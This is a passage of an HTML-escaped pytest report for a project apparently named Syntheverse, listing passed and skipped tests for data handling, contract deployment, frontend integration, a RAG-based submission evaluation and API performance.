TestDataManagement.test_json_data_integrity:test_framework.py:390 Testing JSON data integrity\nINFO     TestDataManagement.test_json_data_integrity:test_framework.py:390 \u2705 JSON data integrity verified\n\n&#34;}], &#34;tests/test_data_management.py::TestDataManagement::test_large_file_handling&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_data_management.py::TestDataManagement::test_large_file_handling&#34;, &#34;duration&#34;: &#34;6 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_data_management.py::TestDataManagement::test_large_file_handling&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;6 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_large_file_handling - PASSED\nDuration: 0.01s\nCategory: integration\nMetrics:\n  large_file_size: 769417\n  large_file_write_time: 0.00\n  large_file_read_time: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,288 - TestDataManagement.test_large_file_handling - INFO - Testing large file handling\n2025-12-18 09:23:56,293 - TestDataManagement.test_large_file_handling - INFO - \u2705 Large file (769417 bytes) handled successfully\n2025-12-18 09:23:56,293 - TestDataManagement.test_large_file_handling - INFO - Write time: 0.00s, Read time: 0.00s\n\n------------------------------ Captured log call -------------------------------\nINFO     TestDataManagement.test_large_file_handling:test_framework.py:390 Testing large file handling\nINFO     TestDataManagement.test_large_file_handling:test_framework.py:390 \u2705 Large file (769417 bytes) handled successfully\nINFO     TestDataManagement.test_large_file_handling:test_framework.py:390 Write time: 0.00s, Read time: 0.00s\n\n&#34;}], &#34;tests/test_deployment.py::TestDeployment::test_deploy_contracts_anvil_management&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_deployment.py::TestDeployment::test_deploy_contracts_anvil_management&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_deployment.py::TestDeployment::test_deploy_contracts_anvil_management&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_deployment.py::TestDeployment::test_deploy_contracts_anvil_not_running&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_deployment.py::TestDeployment::test_deploy_contracts_anvil_not_running&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_deployment.py::TestDeployment::test_deploy_contracts_anvil_not_running&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_deployment.py::TestDeployment::test_main_function_exists&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_deployment.py::TestDeployment::test_main_function_exists&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_deployment.py::TestDeployment::test_main_function_exists&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\nusage: deploy_contracts.py [-h] [--anvil-accounts ANVIL_ACCOUNTS]\n                           [--retries RETRIES] [--no-validation]\n                           [--no-install-deps]\n\nDeploy Syntheverse contracts to Anvil\n\noptions:\n  -h, --help            show this help message and exit\n  --anvil-accounts ANVIL_ACCOUNTS\n                        Number of accounts to create in Anvil (default: 10)\n  --retries RETRIES     Maximum retries for connection attempts (default: 3)\n  --no-validation       Skip contract validation after deployment\n  --no-install-deps     Skip automatic dependency installation (default:\n                        false)\n&#34;}], &#34;tests/test_deployment.py::TestDeployment::test_setup_logging&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_deployment.py::TestDeployment::test_setup_logging&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_deployment.py::TestDeployment::test_setup_logging&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_deployment.py::TestDeploymentValidation::test_artifact_validation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_deployment.py::TestDeploymentValidation::test_artifact_validation&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_deployment.py::TestDeploymentValidation::test_artifact_validation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_error_propagation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_error_propagation&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_error_propagation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 357, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_integration_dashboard&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_integration_dashboard&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_integration_dashboard&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 198, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_integration_sandbox_map&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_integration_sandbox_map&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_integration_sandbox_map&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 239, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_integration_submission&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_integration_submission&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_api_integration_submission&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 219, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_dashboard_page&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_dashboard_page&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_dashboard_page&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 64, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_error_handling&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_error_handling&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_error_handling&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 330, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_homepage&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_homepage&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_homepage&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 39, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_navigation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_navigation&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_navigation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 261, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_responsive_design&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_responsive_design&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_frontend_responsive_design&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 298, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_registry_page&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_registry_page&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_registry_page&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 163, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_sandbox_map_page&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_sandbox_map_page&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_sandbox_map_page&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 128, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_submission_page&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_frontend_integration.py::TestFrontendIntegration::test_submission_page&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_frontend_integration.py::TestFrontendIntegration::test_submission_page&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/Users/4d/Documents/GitHub/Syntheverse/tests/test_frontend_integration.py&amp;#x27;, 101, &amp;#x27;Skipped: Required services (frontend, poc_api) are not running&amp;#x27;)\n&#34;}], &#34;tests/test_full_submission_flow.py::test_full_submission_flow&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_full_submission_flow.py::test_full_submission_flow&#34;, &#34;duration&#34;: &#34;00:00:04&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_full_submission_flow.py::test_full_submission_flow&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:04&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n======================================================================\nTesting Full Submission Flow with RAG API\n======================================================================\n\n[1] Checking RAG API health...\n   \u2705 Health check passed\n   LLM: groq\n   Model: None\n\n[2] Simulating PDF submission...\n\n[3] Building evaluation query...\n   Query length: 1240 characters\n   System prompt length: 2196 characters\n\n[4] Sending evaluation request to RAG API...\n   This simulates what happens during a real submission.\n   Progress stages:\n   [checking_rag_health] Verifying RAG API is accessible...\n   [sending_to_rag] Sending evaluation request to RAG API...\n   [evaluating_rag] Waiting for LLM response (this may take 30-120 seconds)...\n   [parsing_response] Parsing evaluation response...\n\n   Making POST request to http://localhost:8000/query...\n   Using LLM: ollama (Groq unavailable)\n   Timeout: 180 seconds\n\n   \u2705 Response received!\n   Status Code: 200\n   Response time: 1.62 seconds\n\n   Response details:\n   - Answer length: 2581 characters\n   - Sources found: 5\n\n   Answer preview:\n   ## **PoD Evaluation Report**\n\n### **HHFE Metrics**\n\n**Coherence (\u03a6):**\nThe artifact proposes a novel approach to understanding fractal structures in quantum systems, leveraging recursive closure and phase alignment. This demonstrates a strong degree of fractal grammar closure and coherent recursive patterns. We assign \u03a6 = 9,500.\n\n**Density (\u03c1):**\nThe artifact introduces four key contributions:\n1. Novel fractal grammar for quantum coherence\n2. Hydrogen-holographic scaling constants\n3. Recursive a...\n\n   \u2705 Found valid JSON in response:\n   {\n  &amp;quot;coherence&amp;quot;: 9500,\n  &amp;quot;density&amp;quot;: 9000,\n  &amp;quot;redundancy&amp;quot;: 0.2,\n  &amp;quot;epoch_weight&amp;quot;: 0.9,\n  &amp;quot;pod_score&amp;quot;: 8151,\n  &amp;quot;tier&amp;quot;: &amp;quot;gold&amp;quot;,\n  &amp;quot;epoch&amp;quot;: &amp;quot;pioneer&amp;quot;,\n  &amp;quot;tier_justification&amp;quot;: &amp;quot;Scientific contributions aligned with GOLD tier guidelines.&amp;quot;,\n  &amp;quot;redundancy_analysis&amp;quot;: &amp;quot;Low redundancy; no significant similarity to existing artifacts.&amp;quot;,\n  &amp;quot;epoch_justification&amp;quot;: &amp;quot;Density (\\u03c1) exceeds Pioneer epoch threshold (6,000).&amp;quot;,\n  &amp;quot;reasoning&amp;quot;: &amp;quot;Novel fractal grammar, empirical validation framework, and low redundancy support the artifact&amp;#x27;s value.&amp;quot;,\n  &amp;quot;status&amp;quot;: &amp;quot;approved&amp;quot;\n}\n\n   \u2705 All required fields present!\n   - Coherence: 9500\n   - Density: 9000\n   - Redundancy: 0.2\n   - PoD Score: 8151\n   - Tier: gold\n   - Epoch: pioneer\n   - Status: approved\n&#34;}], &#34;tests/test_performance.py::TestPerformance::test_api_response_times&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_performance.py::TestPerformance::test_api_response_times&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_performance.py::TestPerformance::test_api_response_times&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_api_response_times - PASSED\nDuration: 1.27s\nCategory: performance\nMetrics:\n  _health_avg_time: 0.00\n  _health_max_time: 0.00\n  _health_min_time: 0.00\n  _api_archive_statistics_avg_time: 0.00\n  _api_archive_statistics_max_time: 0.00\n  _api_archive_statistics_min_time: 0.00\n  _api_sandbox-map_avg_time: 0.00\n  _api_sandbox-map_max_time: 0.00\n  _api_sandbox-map_min_time: 0.00\n  api_performance_rate: 100.00\n  overall_avg_response_time: 0.00\n  overall_p95_response_time: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:12,154 - TestPerformance.test_api_response_times - INFO - Testing API response times\n2025-12-18 09:24:12,473 - TestPerformance.test_api_response_times - INFO - \u2705 /health: 0.001s (threshold: 30.0s)\n2025-12-18 09:24:12,787 - TestPerformance.test_api_response_times - INFO - \u2705 /api/archive/statistics: 0.002s (threshold: 30.0s)\n2025-12-18 09:24:13,107 - TestPerformance.test_api_response_times - INFO - \u2705 /api/sandbox-map: 0.002s (threshold: 30.0s)\n2025-12-18 09:24:13,425 - TestPerformance.test_api_response_times - INFO - \u2705 /health: 0.002s (threshold: 30.0s)\n2025-12-18 09:24:13,425 - TestPerformance.test_api_response_times - INFO - \u2705 API Performance: 100.0% within thresholds\n2025-12-18 09:24:13,425 - TestPerformance.test_api_response_times - INFO - Average response time: 0.002s\n2025-12-18 09:24:13,425 - TestPerformance.test_api_response_times - INFO - 95th percentile: 0.002s\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPerformance.test_api_response_times:test_framework.py:390 Testing API response times\nINFO     TestPerformance.test_api_response_times:test_framework.py:390 \u2705 /health: 0.001s (threshold: 30.0s)\nINFO     TestPerformance.test_api_response_times:test_framework.py:390 \u2705 /api/archive/statistics: 0.002s (threshold: 30.0s)\nINFO     TestPerformance.test_api_response_times:test_framework.py:390 \u2705 /api/sandbox-map: 0.002s (threshold: 30.0s)\nINFO     TestPerformance.test_api_response_times:test_framework.py:390 \u2705 /health: 0.002s (threshold: 30.0s)\nINFO     TestPerformance.test_api_response_times:test_framework.py:390 \u2705 API Performance: 100.0% within thresholds\nINFO     TestPerformance.test_api_response_times:test_framework.py:390 Average response time: 0.002s\nINFO     TestPerformance.test_api_response_times:test_framework.py:390 95th percentile: 0.002s\n\n&#34;}], &#34;tests/test_performance.py::TestPerformance::test_concurrent_api_load&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_performance.py::TestPerformance::test_concurrent_api_load&#34;, &#34;duration&#34;: &#34;55 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_performance.py::TestPerformance::test_concurrent_api_load&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;55 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_concurrent_api_load - PASSED\nDuration: 0.05s\nCategory: performance\nMetrics:\n  concurrent_success_rate: 100.00\n  concurrent_avg_response_time: 0.01\n  concurrent_p95_response_time: 0.01\n  concurrent_max_response_time: 0.02\n  concurrent_throughput: 993.64\n  concurrent_total_time: 0.05\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:13,429 - TestPerformance.test_concurrent_api_load - INFO - Testing concurrent API load\n2025-12-18 09:24:13,480 - TestPerformance.test_concurrent_api_load - INFO - \u2705 Concurrent load test completed:\n2025-12-18 09:24:13,480 - TestPerformance.test_concurrent_api_load - INFO -   Success rate: 100.0% (50/50)\n2025-12-18 09:24:13,480 - TestPerformance.test_concurrent_api_load - INFO -   Average response time: 0.009s\n2025-12-18 09:24:13,480 - TestPerformance.test_concurrent_api_load - INFO -   95th percentile: 0.014s\n2025-12-18 09:24:13,480 - TestPerformance.test_concurrent_api_load - INFO -   Max response time: 0.017s\n2025-12-18 09:24:13,480 - TestPerformance.test_concurrent_api_load - INFO -   Throughput: 993.64 requests/second\n2025-12-18 09:24:13,480 - TestPerformance.test_concurrent_api_load - INFO -   Total test time: 0.05s\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPerformance.test_concurrent_api_load:test_framework.py:390 Testing concurrent API load\nINFO     TestPerformance.test_concurrent_api_load:test_framework.py:390 \u2705 Concurrent load test completed:\nINFO     TestPerformance.test_concurrent_api_load:test_framework.py:390   Success rate: 100.0% (50/50)\nINFO     TestPerformance.test_concurrent_api_load:test_framework.py:390   Average response time: 0.009s\nINFO     TestPerformance.test_concurrent_api_load:test_framework.py:390   95th percentile: 0.014s\nINFO     TestPerformance.test_concurrent_api_load:test_framework.py:390   Max response time: 0.017s\nINFO     TestPerformance.test_concurrent_api_load:test_framework.py:390   Throughput: 993.64 requests/second\nINFO     TestPerformance.test_concurrent_api_load:test_framework.py:390   Total test time: 0.05s\n\n&#34;}], &#34;tests/test_performance.py::TestPerformance::test_cpu_usage_during_operations&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_performance.py::TestPerformance::test_cpu_usage_during_operations&#34;, &#34;duration&#34;: &#34;794 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_performance.py::TestPerformance::test_cpu_usage_during_operations&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;794 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_cpu_usage_during_operations - PASSED\nDuration: 0.79s\nCategory: performance\nMetrics:\n  cpu_usage_acceptable: True\n  avg_cpu_usage: 0.02\n  max_cpu_usage: 0.10\n  min_cpu_usage: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:24:13,485 - TestPerformance.test_cpu_usage_during_operations - INFO - Testing CPU usage during operations\n2025-12-18 09:24:13,726 - TestPerformance.test_cpu_usage_during_operations - INFO - Task 1: CPU usage 0.1%\n2025-12-18 09:24:13,861 - TestPerformance.test_cpu_usage_during_operations - INFO - Task 2: CPU usage 0.0%\n2025-12-18 09:24:14,000 - TestPerformance.test_cpu_usage_during_operations - INFO - Task 3: CPU usage 0.0%\n2025-12-18 09:24:14,139 - TestPerformance.test_cpu_usage_during_operations - INFO - Task 4: CPU usage 0.0%\n2025-12-18 09:24:14,274 - TestPerformance.test_cpu_usage_during_operations - INFO - Task 5: CPU usage 0.0%\n2025-12-18 09:24:14,275 - 